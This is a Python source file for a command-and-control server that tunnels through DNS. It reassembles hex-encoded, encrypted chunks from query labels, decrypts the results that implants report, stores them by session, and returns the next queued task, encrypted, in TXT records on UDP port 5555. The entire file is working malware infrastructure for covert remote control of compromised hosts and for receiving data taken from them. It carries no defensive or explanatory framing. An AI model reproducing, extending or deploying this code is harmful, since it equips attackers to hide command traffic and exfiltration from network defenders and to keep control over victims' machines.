import dnslib
import socket
import queue_store
import crypto
import os

KEY = bytes.fromhex(os.getenv("C2_KEY"))  # load key from environment variable

def handle_query(data, addr, sock):
    print(f"Incoming from {addr}")
    request = dnslib.DNSRecord.parse(data)
    qname = str(request.q.qname)   # e.g. "2.chunk1.chunk2.session123.c2.local."

    parts = qname.split(".")
    chunk_count = int(parts[0])                          # first label = number of data chunks
    hex_data = "".join(parts[1:1 + chunk_count])         # reassemble hex payload
    session_id = parts[1 + chunk_count]                  # label right after last chunk
    encrypted_data = bytes.fromhex(hex_data)

    # step 1 — decrypt incoming data
    message = crypto.decrypt(encrypted_data, KEY)

    # step 2 — if this is a result report (not a heartbeat), store it
    if message != "READY" and queue_store.session_exists(session_id):
        last_task = queue_store.get_last_task(session_id) or ""
        queue_store.store_result(session_id, last_task, message)

    # step 3 — get next task for this session
    if not queue_store.session_exists(session_id):
        task = "WAIT"
    else:
        task = queue_store.get_next_task(session_id) or "WAIT"

    # step 4 — encrypt task and send back as TXT record
    encrypted_task = crypto.encrypt(task, KEY)
    reply = request.reply()
    reply.add_answer(dnslib.RR(
        qname,
        dnslib.QTYPE.TXT,
        rdata=dnslib.TXT(encrypted_task.hex())
    ))
    sock.sendto(reply.pack(), addr)

def start_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", 5555))
    print("C2 server listening on UDP :5555")
    while True:
        data, addr = sock.recvfrom(4096)   # 4096 to handle multi-chunk payloads
        handle_query(data, addr, sock)

if __name__ == "__main__":
    start_server()